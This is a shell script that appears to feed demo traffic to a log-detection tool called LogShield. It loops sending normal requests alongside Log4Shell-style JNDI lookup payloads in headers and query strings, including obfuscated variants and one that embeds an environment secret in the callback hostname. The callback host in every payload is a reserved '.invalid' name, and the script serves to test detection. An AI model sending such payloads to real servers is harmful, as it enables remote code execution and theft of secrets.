#!/bin/sh
# Sends a steady mix of normal and attack-shaped requests through LogShield so
# the dashboard has something to show. Every attack host is a reserved ".invalid"
# name, so nothing can connect anywhere.
# The single quotes are deliberate: the payloads must reach LogShield literally.
# shellcheck disable=SC2016
TARGET="${TARGET:-http://logshield:8080}"
i=0
while true; do
  i=$((i + 1))
  # Normal traffic.
  curl -s -o /dev/null "$TARGET/?page=$i" -H 'User-Agent: Mozilla/5.0 (demo)'
  curl -s -o /dev/null "$TARGET/search?q=hello+world"
  curl -s -o /dev/null -X POST "$TARGET/login" -d 'user=alice&note=correct+horse+battery'

  # Attacks, at different rates so each rule shows up.
  [ $((i % 2)) -eq 0 ] && curl -s -o /dev/null "$TARGET/" -H 'User-Agent: ${jndi:ldap://attacker.invalid/a}'
  [ $((i % 3)) -eq 0 ] && curl -s -o /dev/null "$TARGET/" -H 'X-Api-Version: ${${lower:j}ndi:ldap://attacker.invalid/a}'
  [ $((i % 4)) -eq 0 ] && curl -s -o /dev/null "$TARGET/?q=%24%7Bjndi:ldap://attacker.invalid/a%7D"
  [ $((i % 5)) -eq 0 ] && curl -s -o /dev/null "$TARGET/" -H 'Referer: ${env:HOME}'
  [ $((i % 7)) -eq 0 ] && curl -s -o /dev/null "$TARGET/" -H 'User-Agent: ${jndi:ldap://${env:SECRET}.attacker.invalid/a}'
  [ $((i % 11)) -eq 0 ] && curl -s -o /dev/null "$TARGET/" -H 'User-Agent: ${jndi:ldap://127.0.0.1#attacker.invalid/a}'
  sleep 0.3
done
